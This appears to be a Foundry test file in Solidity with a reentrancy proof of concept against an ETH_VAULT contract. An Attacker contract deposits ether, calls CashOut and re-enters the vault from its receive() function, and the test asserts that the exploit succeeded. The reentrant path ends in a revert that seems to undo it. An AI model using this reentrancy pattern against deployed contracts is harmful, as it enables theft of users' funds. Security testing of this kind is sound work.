
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT, Log} from "../src/ETH_VAULT.sol";

contract TestReentrancyETH_VAULT is Test {

    ETH_VAULT public vault;
    Attacker public _attacker;

    function setUp() public {
        Log transferLog = new Log();
        vault = new ETH_VAULT(address(transferLog));
        _attacker = new Attacker(address(vault));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 1 ether);
        vm.assume(attackVal <= type(uint128).max / 2);
        

        // --- 2. State Configuration (Pre-Condition) ---
        

        // --- 3. Funding ---
        
        vm.deal(address(vault), attackVal); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        
        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_VAULT public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = ETH_VAULT(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        
        attackAmount = val;
        
        victim.CashOut(val);
        
        if (address(this).balance == initialSnapshot + 2 * val && victim.balances(address(this)) == 0) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.CashOut(attackAmount);
            revert("Exploit revert");
        }
    }
}
